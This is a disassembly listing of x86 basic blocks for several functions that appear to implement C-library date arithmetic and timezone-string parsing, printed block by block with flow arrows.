0xb0a6fdd:	pop	edi
0xb0a6fde:	pop	ebp
0xb0a6fdf:	ret	
None
|
|
|
v
0xb0a6de2:	lea	esi, dword ptr [edx - 0x7b2]
0xb0a6de8:	imul	esi, esi, 0x16d
0xb0a6dee:	lea	eax, dword ptr [edx - 1]
0xb0a6df1:	mov	edx, eax
0xb0a6df3:	sar	edx, 2
0xb0a6df6:	lea	esi, dword ptr [esi + edx - 0x1ec]
0xb0a6dfd:	mov	edx, 0x51eb851f
0xb0a6e02:	imul	edx
0xb0a6e04:	mov	eax, edx
0xb0a6e06:	sar	eax, 5
0xb0a6e09:	sar	edx, 7
0xb0a6e0c:	sub	esi, eax
0xb0a6e0e:	lea	esi, dword ptr [esi + edx + 0xf]
0xb0a6e12:	imul	esi, esi, 0x15180
0xb0a6e18:	mov	eax, dword ptr [ecx + 4]
0xb0a6e1b:	cmp	eax, 1
0xb0a6e1e:	je	0xb0a6fee
None
|
|
|
v
0xb0a6e33:	xor	eax, eax
0xb0a6e35:	test	ebp, 3
0xb0a6e3b:	jne	0xb0a6e75
None
|
|
|
v
0xb0a6e2a:	cmp	eax, 2
0xb0a6e2d:	jne	0xb0a6fcc
None
|
|
|
v
0xb0a6fc0:	movzx	eax, word ptr [ecx + 0xc]
0xb0a6fc4:	imul	eax, eax, 0x15180
0xb0a6fca:	add	esi, eax
0xb0a6fcc:	sub	esi, dword ptr [ecx + 0x14]
0xb0a6fcf:	add	esi, dword ptr [ecx + 0x10]
0xb0a6fd2:	mov	dword ptr [ecx + 0x1c], ebp
0xb0a6fd5:	mov	dword ptr [ecx + 0x18], esi
0xb0a6fd8:	add	esp, 0x10
0xb0a6fdb:	pop	ebx
0xb0a6fdc:	pop	esi
0xb0a6fdd:	pop	edi
0xb0a6fde:	pop	ebp
0xb0a6fdf:	ret	
None
|
|
|
v
0xb0a7006:	test	ebp, 3
0xb0a700c:	jne	0xb0a6fcc
None
|
|
|
v
0xb0a6dc0:	add	ebx, 0x104240
0xb0a6dc6:	cmp	edx, 0xff
0xb0a6dc9:	je	0xb0a6fe0
None
|
|
|
v
0xb0a6fe0:	mov	eax, dword ptr [ecx + 4]
0xb0a6fe3:	xor	esi, esi
0xb0a6fe5:	cmp	eax, 1
0xb0a6fe8:	jne	0xb0a6e24
None
|
|
|
v
0xb0a6e62:	sar	edx, 7
0xb0a6e65:	sub	edx, edi
0xb0a6e67:	imul	eax, edx, 0x190
0xb0a6e6d:	cmp	ebp, eax
0xb0a6e6f:	sete	al
0xb0a6e72:	movzx	eax, al
0xb0a6e75:	movzx	edi, word ptr [ecx + 8]
0xb0a6e79:	lea	edx, dword ptr [eax + eax]
0xb0a6e7c:	add	edx, eax
0xb0a6e7e:	lea	eax, dword ptr [eax + edx*4]
0xb0a6e81:	add	eax, edi
0xb0a6e83:	add	edi, 9
0xb0a6e86:	movzx	edx, word ptr [ebx + eax*2 - 0x4e862]
0xb0a6e8e:	mov	dword ptr [esp + 0xc], eax
0xb0a6e92:	imul	eax, edx, 0x15180
0xb0a6e98:	mov	dword ptr [esp + 4], edx
0xb0a6e9c:	mov	edx, 0x2aaaaaab
0xb0a6ea1:	add	esi, eax
0xb0a6ea3:	mov	eax, edi
0xb0a6ea5:	imul	edx
0xb0a6ea7:	mov	dword ptr [esp + 8], esi
0xb0a6eab:	mov	esi, ebp
0xb0a6ead:	shr	edx, 1
0xb0a6eaf:	lea	eax, dword ptr [edx + edx*2]
0xb0a6eb2:	mov	edx, 0x51eb851f
0xb0a6eb7:	shl	eax, 2
0xb0a6eba:	sub	edi, eax
0xb0a6ebc:	add	edi, 1
0xb0a6ebf:	cmp	word ptr [ecx + 8], 3
0xb0a6ec4:	sbb	esi, 0
0xb0a6ec7:	mov	eax, esi
0xb0a6ec9:	imul	edx
0xb0a6ecb:	mov	eax, esi
0xb0a6ecd:	sar	eax, 0x1f
0xb0a6ed0:	imul	edi, edi, 0x1a
0xb0a6ed3:	sar	edx, 5
0xb0a6ed6:	sub	edx, eax
0xb0a6ed8:	imul	eax, edx, 0x64
0xb0a6edb:	sub	edi, 2
0xb0a6ede:	mov	dword ptr [esp], edx
0xb0a6ee1:	mov	edx, 0x66666667
0xb0a6ee6:	sub	esi, eax
0xb0a6ee8:	mov	eax, edi
0xb0a6eea:	imul	edx
0xb0a6eec:	sar	edi, 0x1f
0xb0a6eef:	lea	eax, dword ptr [esi + 3]
0xb0a6ef2:	sar	edx, 2
0xb0a6ef5:	sub	edx, edi
0xb0a6ef7:	test	esi, esi
0xb0a6ef9:	lea	edx, dword ptr [esi + edx + 1]
0xb0a6efd:	cmovs	esi, eax
0xb0a6f00:	sar	esi, 2
0xb0a6f03:	add	esi, edx
0xb0a6f05:	mov	edx, dword ptr [esp]
0xb0a6f08:	test	edx, edx
0xb0a6f0a:	lea	eax, dword ptr [edx + 3]
0xb0a6f0d:	cmovns	eax, edx
0xb0a6f10:	neg	edx
0xb0a6f12:	sar	eax, 2
0xb0a6f15:	add	eax, esi
0xb0a6f17:	lea	esi, dword ptr [eax + edx*2]
0xb0a6f1a:	mov	edx, 0x92492493
0xb0a6f1f:	mov	eax, esi
0xb0a6f21:	mov	edi, esi
0xb0a6f23:	imul	edx
0xb0a6f25:	sar	edi, 0x1f
0xb0a6f28:	lea	eax, dword ptr [edx + esi]
0xb0a6f2b:	sar	eax, 2
0xb0a6f2e:	sub	eax, edi
0xb0a6f30:	movzx	edi, word ptr [ecx + 0xa]
0xb0a6f34:	lea	edx, dword ptr [eax*8]
0xb0a6f3b:	sub	edx, eax
0xb0a6f3d:	sub	esi, edx
0xb0a6f3f:	test	esi, esi
0xb0a6f41:	mov	eax, esi
0xb0a6f43:	lea	edx, dword ptr [esi + 7]
0xb0a6f46:	cmovs	eax, edx
0xb0a6f49:	movzx	edx, word ptr [ecx + 0xc]
0xb0a6f4d:	sub	edx, eax
0xb0a6f4f:	test	edx, edx
0xb0a6f51:	lea	eax, dword ptr [edx + 7]
0xb0a6f54:	cmovs	edx, eax
0xb0a6f57:	cmp	edi, 1
0xb0a6f5a:	jbe	0xb0a7049
None
|
|
|
v
0xb0a7038:	sar	edx, 7
0xb0a703b:	sub	edx, eax
0xb0a703d:	imul	eax, edx, 0x190
0xb0a7043:	cmp	ebp, eax
0xb0a7045:	jne	0xb0a6fcc
None
|
|
|
v
0xb0a6e18:	mov	eax, dword ptr [ecx + 4]
0xb0a6e1b:	cmp	eax, 1
0xb0a6e1e:	je	0xb0a6fee
None
|
|
|
v
0xb0a6f7e:	lea	eax, dword ptr [edi*8]
0xb0a6f85:	sub	eax, edi
0xb0a6f87:	lea	edi, dword ptr [edx + eax - 7]
0xb0a6f8b:	mov	eax, dword ptr [esp]
0xb0a6f8e:	jmp	0xb0a6f99
None
|
|
|
v
0xb0a6dd8:	xor	esi, esi
0xb0a6dda:	cmp	edx, 0x7b2
0xb0a6de0:	jle	0xb0a6e18
None
|
|
|
v
0xb0a7049:	mov	esi, edx
0xb0a704b:	jmp	0xb0a6f9d
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a7050
TOTAL BLOCKS :8
0xb0a7050:	push	edi
0xb0a7051:	xor	ecx, ecx
0xb0a7053:	push	esi
0xb0a7054:	push	ebx
0xb0a7055:	call	0xb1267db
None
|
|
|
v
0xb0a70c3:	mov	dword ptr [ebx + 0x37ac], eax
0xb0a70c9:	add	esp, 0x10
0xb0a70cc:	pop	ebx
0xb0a70cd:	pop	esi
0xb0a70ce:	pop	edi
0xb0a70cf:	ret	
None
|
|
|
v
0xb0a70bf:	cmp	eax, edx
0xb0a70c1:	jbe	0xb0a70c9
None
|
|
|
v
0xb0a70a3:	mov	dword ptr [esp], edi
0xb0a70a6:	mov	esi, eax
0xb0a70a8:	call	0xb07ae80
None
|
|
|
v
0xb0a705a:	add	ebx, 0x103fa6
0xb0a7060:	sub	esp, 0x10
0xb0a7063:	mov	eax, dword ptr [ebx + 0x1b74]
0xb0a7069:	cmp	eax, dword ptr [ebx + 0x1b94]
0xb0a706f:	mov	edx, dword ptr [ebx - 0xb0]
0xb0a7075:	mov	edi, dword ptr [ebx + 0x1b80]
0xb0a707b:	setne	cl
0xb0a707e:	neg	eax
0xb0a7080:	mov	dword ptr [edx], ecx
0xb0a7082:	mov	edx, dword ptr [ebx - 0xe8]
0xb0a7088:	mov	dword ptr [edx], eax
0xb0a708a:	mov	edx, dword ptr [ebx - 0xec]
0xb0a7090:	mov	eax, dword ptr [ebx + 0x1b60]
0xb0a7096:	mov	dword ptr [edx + 4], edi
0xb0a7099:	mov	dword ptr [edx], eax
0xb0a709b:	mov	dword ptr [esp], eax
0xb0a709e:	call	0xb07ae80
None
|
|
|
v
0xb0a70b7:	mov	dword ptr [ebx + 0x37ac], esi
0xb0a70bd:	mov	edx, esi
0xb0a70bf:	cmp	eax, edx
0xb0a70c1:	jbe	0xb0a70c9
None
|
|
|
v
0xb0a70ad:	mov	edx, dword ptr [ebx + 0x37ac]
0xb0a70b3:	cmp	esi, edx
0xb0a70b5:	jbe	0xb0a70bf
None
|
|
|
v
0xb0a70c9:	add	esp, 0x10
0xb0a70cc:	pop	ebx
0xb0a70cd:	pop	esi
0xb0a70ce:	pop	edi
0xb0a70cf:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a70d0
TOTAL BLOCKS :18
0xb0a7102:	mov	edx, dword ptr [esi + 4]
0xb0a7105:	cmp	ebp, edx
0xb0a7107:	ja	0xb0a7123
None
|
|
|
v
0xb0a70dc:	add	ebx, 0x103f24
0xb0a70e2:	mov	eax, dword ptr [esp + 0x30]
0xb0a70e6:	mov	dword ptr [esp], eax
0xb0a70e9:	call	0xb07ae80
None
|
|
|
v
0xb0a717c:	xor	eax, eax
0xb0a717e:	jmp	0xb0a715e
None
|
|
|
v
0xb0a7156:	test	esi, esi
0xb0a7158:	je	0xb0a7172
None
|
|
|
v
0xb0a711f:	test	eax, eax
0xb0a7121:	je	0xb0a7168
None
|
|
|
v
0xb0a7109:	mov	eax, dword ptr [esp + 0x30]
0xb0a710d:	sub	edx, ebp
0xb0a710f:	lea	edi, dword ptr [esi + edx + 8]
0xb0a7113:	mov	dword ptr [esp + 4], edi
0xb0a7117:	mov	dword ptr [esp], eax
0xb0a711a:	call	0xb07a740
None
|
|
|
v
0xb0a7168:	add	esp, 0x1c
0xb0a716b:	mov	eax, edi
0xb0a716d:	pop	ebx
0xb0a716e:	pop	esi
0xb0a716f:	pop	edi
0xb0a7170:	pop	ebp
0xb0a7171:	ret	
None
|
|
|
v
0xb0a715e:	add	esp, 0x1c
0xb0a7161:	pop	ebx
0xb0a7162:	pop	esi
0xb0a7163:	pop	edi
0xb0a7164:	pop	ebp
0xb0a7165:	ret	
None
|
|
|
v
0xb0a70fa:	jmp	0xb0a7129
None
|
|
|
v
0xb0a70ee:	mov	esi, dword ptr [ebx + 0x1b50]
0xb0a70f4:	test	esi, esi
0xb0a70f6:	mov	ebp, eax
0xb0a70f8:	jne	0xb0a7102
None
|
|
|
v
0xb0a7129:	lea	eax, dword ptr [ebp + 9]
0xb0a712c:	mov	dword ptr [esp], eax
0xb0a712f:	call	0xb0173f0
None
|
|
|
v
0xb0a7134:	test	eax, eax
0xb0a7136:	mov	edi, eax
0xb0a7138:	je	0xb0a717c
None
|
|
|
v
0xb0a7123:	mov	edx, dword ptr [esi]
0xb0a7125:	test	edx, edx
0xb0a7127:	jne	0xb0a7100
None
|
|
|
v
0xb0a715a:	mov	dword ptr [esi], edi
0xb0a715c:	mov	eax, ebp
0xb0a715e:	add	esp, 0x1c
0xb0a7161:	pop	ebx
0xb0a7162:	pop	esi
0xb0a7163:	pop	edi
0xb0a7164:	pop	ebp
0xb0a7165:	ret	
None
|
|
|
v
0xb0a7100:	mov	esi, edx
0xb0a7102:	mov	edx, dword ptr [esi + 4]
0xb0a7105:	cmp	ebp, edx
0xb0a7107:	ja	0xb0a7123
None
|
|
|
v
0xb0a7172:	mov	dword ptr [ebx + 0x1b50], edi
0xb0a7178:	mov	eax, ebp
0xb0a717a:	jmp	0xb0a715e
None
|
|
|
v
0xb0a713a:	mov	dword ptr [eax + 4], ebp
0xb0a713d:	lea	ebp, dword ptr [eax + 8]
0xb0a7140:	mov	dword ptr [eax], 0
0xb0a7146:	mov	eax, dword ptr [esp + 0x30]
0xb0a714a:	mov	dword ptr [esp], ebp
0xb0a714d:	mov	dword ptr [esp + 4], eax
0xb0a7151:	call	0xb07a810
None
|
|
|
v
0xb0a70d0:	push	ebp
0xb0a70d1:	push	edi
0xb0a70d2:	push	esi
0xb0a70d3:	push	ebx
0xb0a70d4:	sub	esp, 0x1c
0xb0a70d7:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a7180
TOTAL BLOCKS :123
0xb0a7746:	cmp	word ptr [esi + 0xc], 6
0xb0a774b:	ja	0xb0a7320
None
|
|
|
v
0xb0a7271:	mov	eax, dword ptr [ebp - 0x2c]
0xb0a7274:	mov	dword ptr [esp], eax
0xb0a7277:	call	0xb0a70d0
None
|
|
|
v
0xb0a76e6:	mov	eax, dword ptr [ebp - 0x30]
0xb0a76e9:	mov	dword ptr [esi + 4], 2
0xb0a76f0:	mov	dword ptr [esp], edx
0xb0a76f3:	mov	dword ptr [ebp - 0x2c], edx
0xb0a76f6:	mov	dword ptr [esp + 0x14], eax
0xb0a76fa:	lea	eax, dword ptr [esi + 0xc]
0xb0a76fd:	mov	dword ptr [esp + 0x10], eax
0xb0a7701:	lea	eax, dword ptr [esi + 0xa]
0xb0a7704:	mov	dword ptr [esp + 0xc], eax
0xb0a7708:	lea	eax, dword ptr [esi + 8]
0xb0a770b:	mov	dword ptr [esp + 8], eax
0xb0a770f:	mov	eax, dword ptr [ebp - 0x38]
0xb0a7712:	mov	dword ptr [esp + 4], eax
0xb0a7716:	call	0xb0551c0
None
|
|
|
v
0xb0a7798:	nop	
0xb0a7799:	lea	esi, dword ptr [esi]
0xb0a77a0:	jmp	0xb0a7320
None
|
|
|
v
0xb0a780d:	movzx	ecx, word ptr [ebp - 0x24]
0xb0a7811:	movzx	eax, word ptr [ebp - 0x26]
0xb0a7815:	movzx	edx, word ptr [ebp - 0x22]
0xb0a7819:	imul	ecx, ecx, 0x3c
0xb0a781c:	imul	eax, eax, 0xe10
0xb0a7822:	add	eax, ecx
0xb0a7824:	add	eax, edx
0xb0a7826:	jmp	0xb0a7690
None
|
|
|
v
0xb0a77bd:	xor	eax, eax
0xb0a77bf:	xor	edx, edx
0xb0a77c1:	mov	word ptr [ebp - 0x24], ax
0xb0a77c5:	xor	eax, eax
0xb0a77c7:	mov	word ptr [ebp - 0x22], ax
0xb0a77cb:	xor	eax, eax
0xb0a77cd:	movzx	ecx, word ptr [ebp - 0x26]
0xb0a77d1:	mov	dword ptr [esp], ecx
0xb0a77d4:	call	0xb0a6d70
None
|
|
|
v
0xb0a7251:	cmp	al, 0x2d
0xb0a7253:	je	0xb0a7238
None
|
|
|
v
0xb0a7192:	add	ebx, 0x103e6e
0xb0a7198:	sub	esp, 0x6c
0xb0a719b:	mov	esi, dword ptr [ebp + 8]
0xb0a719e:	lea	edi, dword ptr [ebx + 0x1b60]
0xb0a71a4:	mov	dword ptr [ebp - 0x34], edi
0xb0a71a7:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb0a771b:	cmp	eax, 3
0xb0a771e:	jne	0xb0a7320
None
|
|
|
v
0xb0a7662:	cmp	eax, 3
0xb0a7665:	je	0xb0a780d
None
|
|
|
v
0xb0a7690:	mov	edx, dword ptr [ebp - 0x4c]
0xb0a7693:	add	edx, dword ptr [ebp - 0x20]
0xb0a7696:	cmp	byte ptr [ebp - 0x2c], 1
0xb0a769a:	sbb	ecx, ecx
0xb0a769c:	and	ecx, 2
0xb0a769f:	sub	ecx, 1
0xb0a76a2:	imul	eax, ecx
0xb0a76a5:	mov	dword ptr [esi + 0x10], eax
0xb0a76a8:	jmp	0xb0a75db
None
|
|
|
v
0xb0a77c5:	xor	eax, eax
0xb0a77c7:	mov	word ptr [ebp - 0x22], ax
0xb0a77cb:	xor	eax, eax
0xb0a77cd:	movzx	ecx, word ptr [ebp - 0x26]
0xb0a77d1:	mov	dword ptr [esp], ecx
0xb0a77d4:	call	0xb0a6d70
None
|
|
|
v
0xb0a7467:	mov	dword ptr [ebx + 0x1b80], eax
0xb0a746d:	movzx	eax, byte ptr [edi]
0xb0a7470:	cmp	al, 0x2d
0xb0a7472:	sete	dl
0xb0a7475:	cmp	al, 0x2b
0xb0a7477:	je	0xb0a7481
None
|
|
|
v
0xb0a74d7:	cmp	eax, 1
0xb0a74da:	je	0xb0a77bd
None
|
|
|
v
0xb0a71c6:	lea	edx, dword ptr [eax + 1]
0xb0a71c9:	add	eax, 0x1f
0xb0a71cc:	and	eax, 0xfffffff0
0xb0a71cf:	sub	esp, eax
0xb0a71d1:	lea	eax, dword ptr [esp + 0x2f]
0xb0a71d5:	and	eax, 0xfffffff0
0xb0a71d8:	mov	dword ptr [esp + 8], edx
0xb0a71dc:	mov	dword ptr [esp + 4], esi
0xb0a71e0:	mov	dword ptr [esp], eax
0xb0a71e3:	call	0xb07d0b0
None
|
|
|
v
0xb0a75c1:	movzx	eax, byte ptr [edx]
0xb0a75c4:	cmp	al, 0x2f
0xb0a75c6:	je	0xb0a75f9
None
|
|
|
v
0xb0a7325:	lea	esp, dword ptr [ebp - 0xc]
0xb0a7328:	pop	ebx
0xb0a7329:	pop	esi
0xb0a732a:	pop	edi
0xb0a732b:	pop	ebp
0xb0a732c:	ret	
None
|
|
|
v
0xb0a75c8:	test	al, al
0xb0a75ca:	je	0xb0a75f9
None
|
|
|
v
0xb0a7676:	mov	eax, 2
0xb0a767b:	mov	word ptr [ebp - 0x26], ax
0xb0a767f:	mov	eax, 0x1c20
0xb0a7684:	xor	ecx, ecx
0xb0a7686:	mov	word ptr [ebp - 0x24], cx
0xb0a768a:	xor	edx, edx
0xb0a768c:	mov	word ptr [ebp - 0x22], dx
0xb0a7690:	mov	edx, dword ptr [ebp - 0x4c]
0xb0a7693:	add	edx, dword ptr [ebp - 0x20]
0xb0a7696:	cmp	byte ptr [ebp - 0x2c], 1
0xb0a769a:	sbb	ecx, ecx
0xb0a769c:	and	ecx, 2
0xb0a769f:	sub	ecx, 1
0xb0a76a2:	imul	eax, ecx
0xb0a76a5:	mov	dword ptr [esi + 0x10], eax
0xb0a76a8:	jmp	0xb0a75db
None
|
|
|
v
0xb0a7439:	cmp	al, 0x2d
0xb0a743b:	je	0xb0a7420
None
|
|
|
v
0xb0a724d:	cmp	al, 0x2b
0xb0a724f:	je	0xb0a7238
None
|
|
|
v
0xb0a73ca:	movzx	edx, word ptr [ebp - 0x24]
0xb0a73ce:	jmp	0xb0a737e
None
|
|
|
v
0xb0a75d4:	mov	dword ptr [esi + 0x10], 0x1c20
0xb0a75db:	add	edi, 1
0xb0a75de:	add	esi, 0x20
0xb0a75e1:	mov	dword ptr [esi - 4], 0xffffffff
0xb0a75e8:	cmp	edi, 2
0xb0a75eb:	je	0xb0a7320
None
|
|
|
v
0xb0a77b6:	add	edi, eax
0xb0a77b8:	jmp	0xb0a745c
None
|
|
|
v
0xb0a7481:	add	edi, 1
0xb0a7484:	cmp	dl, 1
0xb0a7487:	sbb	eax, eax
0xb0a7489:	or	eax, 1
0xb0a748c:	mov	dword ptr [ebx + 0x1b94], eax
0xb0a7492:	mov	eax, dword ptr [ebp - 0x30]
0xb0a7495:	mov	ecx, dword ptr [ebp - 0x48]
0xb0a7498:	mov	dword ptr [esp], edi
0xb0a749b:	mov	dword ptr [esp + 0x1c], eax
0xb0a749f:	mov	dword ptr [esp + 0x14], eax
0xb0a74a3:	mov	dword ptr [esp + 0xc], eax
0xb0a74a7:	mov	eax, dword ptr [ebp - 0x40]
0xb0a74aa:	mov	dword ptr [esp + 0x18], ecx
0xb0a74ae:	mov	ecx, dword ptr [ebp - 0x44]
0xb0a74b1:	mov	dword ptr [esp + 8], eax
0xb0a74b5:	mov	eax, dword ptr [ebp - 0x3c]
0xb0a74b8:	mov	dword ptr [esp + 0x10], ecx
0xb0a74bc:	mov	dword ptr [esp + 4], eax
0xb0a74c0:	call	0xb0551c0
None
|
|
|
v
0xb0a7386:	movzx	ecx, word ptr [ebp - 0x26]
0xb0a738a:	mov	dword ptr [esp], ecx
0xb0a738d:	call	0xb0a6d70
None
|
|
|
v
0xb0a753c:	movzx	eax, byte ptr [edi]
0xb0a753f:	mov	ecx, dword ptr [ebp - 0x34]
0xb0a7542:	xor	esi, esi
0xb0a7544:	lea	edx, dword ptr [ebx - 0x491a5]
0xb0a754a:	mov	dword ptr [ebp - 0x38], edx
0xb0a754d:	mov	edx, edi
0xb0a754f:	mov	edi, esi
0xb0a7551:	mov	esi, ecx
0xb0a7553:	cmp	al, 0x2c
0xb0a7555:	sete	al
0xb0a7558:	movzx	eax, al
0xb0a755b:	add	edx, eax
0xb0a755d:	movzx	eax, byte ptr [edx]
0xb0a7560:	cmp	al, 0x4a
0xb0a7562:	je	0xb0a776b
None
|
|
|
v
0xb0a730b:	cmp	eax, 1
0xb0a730e:	nop	
0xb0a7310:	je	0xb0a7376
None
|
|
|
v
0xb0a75f1:	movzx	eax, byte ptr [edx]
0xb0a75f4:	jmp	0xb0a7553
None
|
|
|
v
0xb0a7580:	lea	eax, dword ptr [ebp - 0x1c]
0xb0a7583:	mov	dword ptr [esp], ecx
0xb0a7586:	mov	dword ptr [esp + 8], 0xa
0xb0a758e:	mov	dword ptr [esp + 4], eax
0xb0a7592:	mov	dword ptr [ebp - 0x2c], ecx
0xb0a7595:	call	0xb0346e0
None
|
|
|
v
0xb0a7360:	add	esi, eax
0xb0a7362:	jmp	0xb0a7271
None
|
|
|
v
0xb0a7435:	cmp	al, 0x2b
0xb0a7437:	je	0xb0a7420
None
|
|
|
v
0xb0a7338:	movsx	edx, al
0xb0a733b:	sub	edx, 0x30
0xb0a733e:	cmp	edx, 9
0xb0a7341:	ja	0xb0a7320
None
|
|
|
v
0xb0a7553:	cmp	al, 0x2c
0xb0a7555:	sete	al
0xb0a7558:	movzx	eax, al
0xb0a755b:	add	edx, eax
0xb0a755d:	movzx	eax, byte ptr [edx]
0xb0a7560:	cmp	al, 0x4a
0xb0a7562:	je	0xb0a776b
None
|
|
|
v
0xb0a726e:	mov	byte ptr [ecx], 0
0xb0a7271:	mov	eax, dword ptr [ebp - 0x2c]
0xb0a7274:	mov	dword ptr [esp], eax
0xb0a7277:	call	0xb0a70d0
None
|
|
|
v
0xb0a729e:	test	dl, dl
0xb0a72a0:	je	0xb0a7367
None
|
|
|
v
0xb0a73a9:	mov	edx, dword ptr [ebx + 0x1b60]
0xb0a73af:	mov	dword ptr [ebx + 0x1b94], eax
0xb0a73b5:	mov	dword ptr [ebx + 0x1b80], edx
0xb0a73bb:	jmp	0xb0a7320
None
|
|
|
v
0xb0a7877:	mov	dword ptr [ebx + 0x1b4c], 0
0xb0a7881:	jmp	0xb0a7325
None
|
|
|
v
0xb0a77d9:	add	edi, dword ptr [ebp - 0x20]
0xb0a77dc:	imul	eax, dword ptr [ebx + 0x1b94]
0xb0a77e3:	mov	dword ptr [ebx + 0x1b94], eax
0xb0a77e9:	jmp	0xb0a74f1
None
|
|
|
v
0xb0a7220:	mov	ecx, dword ptr gs:[0]
0xb0a7227:	mov	eax, dword ptr [ebx - 0x110]
0xb0a722d:	mov	edi, dword ptr [ecx + eax]
0xb0a7230:	mov	ecx, dword ptr [ebp - 0x2c]
0xb0a7233:	jmp	0xb0a7241
None
|
|
|
v
0xb0a7429:	movzx	eax, byte ptr [edx]
0xb0a742c:	movsx	esi, al
0xb0a742f:	test	byte ptr [edi + esi*2], 8
0xb0a7433:	jne	0xb0a7420
None
|
|
|
v
0xb0a7350:	jmp	0xb0a729e
None
|
|
|
v
0xb0a7785:	jmp	0xb0a7320
None
|
|
|
v
0xb0a7241:	movzx	eax, byte ptr [edx]
0xb0a7244:	movsx	esi, al
0xb0a7247:	test	byte ptr [edi + esi*2], 8
0xb0a724b:	jne	0xb0a7238
None
|
|
|
v
0xb0a76ad:	cmp	al, 0x4d
0xb0a76af:	je	0xb0a76e6
None
|
|
|
v
0xb0a71a9:	lea	eax, dword ptr [ebx - 0x4aa73]
0xb0a71af:	mov	dword ptr [esp], esi
0xb0a71b2:	lea	edi, dword ptr [ebp - 0x20]
0xb0a71b5:	mov	dword ptr [ebx + 0x1b80], eax
0xb0a71bb:	mov	dword ptr [ebx + 0x1b60], eax
0xb0a71c1:	call	0xb07ae80
None
|
|
|
v
0xb0a782b:	movzx	ecx, word ptr [ebp - 0x24]
0xb0a782f:	movzx	eax, word ptr [ebp - 0x26]
0xb0a7833:	imul	ecx, ecx, 0x3c
0xb0a7836:	imul	eax, eax, 0xe10
0xb0a783c:	add	eax, ecx
0xb0a783e:	jmp	0xb0a768a
None
|
|
|
v
0xb0a7392:	mov	edi, dword ptr [ebp - 0x20]
0xb0a7395:	imul	eax, dword ptr [ebx + 0x1b74]
0xb0a739c:	add	edi, esi
0xb0a739e:	mov	dword ptr [ebx + 0x1b74], eax
0xb0a73a4:	cmp	byte ptr [edi], 0
0xb0a73a7:	jne	0xb0a73d0
None
|
|
|
v
0xb0a77fe:	movzx	eax, word ptr [ebp - 0x26]
0xb0a7802:	imul	eax, eax, 0xe10
0xb0a7808:	jmp	0xb0a7684
None
|
|
|
v
0xb0a720b:	cmp	eax, 1
0xb0a720e:	je	0xb0a7358
None
|
|
|
v
0xb0a71e8:	mov	dword ptr [ebp - 0x30], edi
0xb0a71eb:	mov	dword ptr [esp + 0xc], edi
0xb0a71ef:	lea	edi, dword ptr [ebx - 0x491c3]
0xb0a71f5:	mov	dword ptr [esp + 4], edi
0xb0a71f9:	mov	dword ptr [esp], esi
0xb0a71fc:	mov	dword ptr [ebp - 0x38], edi
0xb0a71ff:	mov	dword ptr [esp + 8], eax
0xb0a7203:	mov	dword ptr [ebp - 0x2c], eax
0xb0a7206:	call	0xb0551c0
None
|
|
|
v
0xb0a76c9:	mov	eax, 0xb
0xb0a76ce:	mov	word ptr [esi + 8], ax
0xb0a76d2:	mov	eax, 1
0xb0a76d7:	mov	word ptr [esi + 0xa], ax
0xb0a76db:	xor	eax, eax
0xb0a76dd:	mov	word ptr [esi + 0xc], ax
0xb0a76e1:	jmp	0xb0a75c1
None
|
|
|
v
0xb0a77ee:	movzx	eax, word ptr [ebp - 0x22]
0xb0a77f2:	movzx	edx, word ptr [ebp - 0x24]
0xb0a77f6:	jmp	0xb0a77cd
None
|
|
|
v
0xb0a73c0:	movzx	eax, word ptr [ebp - 0x22]
0xb0a73c4:	movzx	edx, word ptr [ebp - 0x24]
0xb0a73c8:	jmp	0xb0a7386
None
|
|
|
v
0xb0a73ed:	cmp	eax, 1
0xb0a73f0:	je	0xb0a77a8
None
|
|
|
v
0xb0a74ce:	cmp	eax, 3
0xb0a74d1:	je	0xb0a77ee
None
|
|
|
v
0xb0a74f1:	movzx	eax, byte ptr [edi]
0xb0a74f4:	test	al, al
0xb0a74f6:	je	0xb0a7502
None
|
|
|
v
0xb0a74f8:	cmp	al, 0x2c
0xb0a74fa:	jne	0xb0a753f
None
|
|
|
v
0xb0a7320:	call	0xb0a7050
None
|
|
|
v
0xb0a77f8:	movzx	edx, word ptr [ebp - 0x24]
0xb0a77fc:	jmp	0xb0a77c5
None
|
|
|
v
0xb0a7479:	test	dl, dl
0xb0a747b:	je	0xb0a775c
None
|
|
|
v
0xb0a7751:	mov	edx, dword ptr [ebp - 0x2c]
0xb0a7754:	add	edx, dword ptr [ebp - 0x20]
0xb0a7757:	jmp	0xb0a75c1
None
|
|
|
v
0xb0a7367:	mov	dword ptr [ebx + 0x1b74], 0xffffffff
0xb0a7371:	jmp	0xb0a72b7
None
|
|
|
v
0xb0a75f9:	cmp	al, 0x2f
0xb0a75fb:	jne	0xb0a75d4
None
|
|
|
v
0xb0a7343:	cmp	al, 0x2d
0xb0a7345:	sete	dl
0xb0a7348:	cmp	al, 0x2b
0xb0a734a:	je	0xb0a72a6
None
|
|
|
v
0xb0a7724:	movzx	eax, word ptr [esi + 8]
0xb0a7728:	sub	eax, 1
0xb0a772b:	cmp	ax, 0xb
0xb0a772f:	ja	0xb0a7320
None
|
|
|
v
0xb0a72b7:	mov	eax, dword ptr [ebp - 0x30]
0xb0a72ba:	lea	edi, dword ptr [ebp - 0x22]
0xb0a72bd:	mov	dword ptr [ebp - 0x48], edi
0xb0a72c0:	mov	dword ptr [esp + 0x18], edi
0xb0a72c4:	lea	edi, dword ptr [ebp - 0x24]
0xb0a72c7:	mov	dword ptr [esp + 0x10], edi
0xb0a72cb:	mov	dword ptr [esp + 0x1c], eax
0xb0a72cf:	mov	dword ptr [esp + 0x14], eax
0xb0a72d3:	mov	dword ptr [esp + 0xc], eax
0xb0a72d7:	lea	eax, dword ptr [ebp - 0x26]
0xb0a72da:	mov	dword ptr [ebp - 0x40], eax
0xb0a72dd:	mov	dword ptr [esp + 8], eax
0xb0a72e1:	lea	eax, dword ptr [ebx - 0x491b7]
0xb0a72e7:	mov	dword ptr [esp + 4], eax
0xb0a72eb:	mov	dword ptr [esp], esi
0xb0a72ee:	mov	dword ptr [ebp - 0x44], edi
0xb0a72f1:	mov	dword ptr [ebp - 0x3c], eax
0xb0a72f4:	call	0xb0551c0
None
|
|
|
v
0xb0a73f6:	movzx	eax, byte ptr [edi]
0xb0a73f9:	lea	edx, dword ptr [edi + 1]
0xb0a73fc:	cmp	al, 0x3c
0xb0a73fe:	jne	0xb0a753f
None
|
|
|
v
